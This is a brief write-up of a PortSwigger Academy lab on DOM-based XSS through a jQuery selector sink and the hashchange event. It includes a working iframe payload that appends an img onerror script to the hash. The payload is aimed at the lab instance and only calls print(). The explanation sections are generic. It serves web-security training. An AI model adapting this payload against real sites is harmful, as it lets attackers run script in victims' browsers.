# DOM XSS in jQuery selector sink using a hashchange event

**Lab URL:** https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-selector-hash-change-event

## Metadata

| Property | Value |
|----------|-------|

---

### Target Goal:

Exploit the DOM-based XSS vulnerability to call the print() function

### Analysis/Exploit:

the `iframe`’s `src` attribute points to the vulnerable page with an empty hash value. When the `iframe` is loaded, an XSS payload is appended to the hash, causing the `hashchange` event to fire.

```javascript
<iframe src="https://0a63007904e71eb080612b3800ab000f.web-security-academy.net/#" onload="this.src+='<img src=x onError=print()>' "> </iframe>
```

![](https://raw.githubusercontent.com/ExploitResearch/PortSwigger-Labs/main/images/4b886ff1713c_001.png)

### Why It Works

The application has a DOM-based cross-site scripting vulnerability in the application, which can be exploited by crafting input that bypasses the insufficient validation in place.

### Key Takeaways

- The DOM-based cross-site scripting vulnerability is exploitable because user input is processed without adequate validation.
